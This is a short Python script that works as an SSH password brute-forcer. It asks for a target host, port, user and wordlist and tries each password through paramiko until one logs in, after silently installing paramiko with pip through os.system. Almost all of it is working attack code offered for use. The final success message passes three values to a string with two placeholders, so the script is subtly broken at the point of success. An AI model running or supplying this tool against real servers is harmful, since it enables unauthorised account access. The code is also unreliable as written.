import os

try:
    import paramiko
except ModuleNotFoundError:
    print("[!] installing paramiko")
    os.system("pip3 install paramiko")
    os.system("pip install paramiko")
os.system("clear")

def _brute_():
    banner = """
    =========================
        ___    ___   _    _
       / __|  / __| | |  | |
       \ \    \ \   | |__| |
     __/ /  __/ /   |  __  |
    |___/  |___/    |_|  |_|

    ==========[SSH]==========
   
   
    """
    print(banner)
    host = input("[ENTER] target server (can leave blank): ")
    p = int(input("[ENTER] target port: "))
    user = input("[ENTER] target user (can leave blank): ")
    valid = False
    while not valid:
        try:
            wordlist = input("[#] wordlist : ")
            open(wordlist,"r")
            valid = True
        except Exception:
            print("[!] file not found") 
            print("[!] enter full path")
            print("EG: /home/user/file.txt\n\n")
    os.system("clear")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    f = open(wordlist,'r')
    data = f.readlines()
    len_data = len(data)
    print("[SSH] wordlist contain [ %s ] words."%len_data)
    print("[SSH] connected to target ssh [ %s ]."%host)
    print("[SSH] starting attack on user [ %s ]."%user)
    print("\n\n")
    for pas in data:
        pas = pas.replace("\n","")
        len_data -= 1
        try:
            ssh.connect(host,port=p,username=user, password=pas);
            print("\n")
            os.system("clear")
            print(banner)
            print("[SSH] password found! \nuser: %s \n password: %s "%(len_data,user,pas))
            break
        except paramiko.AuthenticationException:
            pass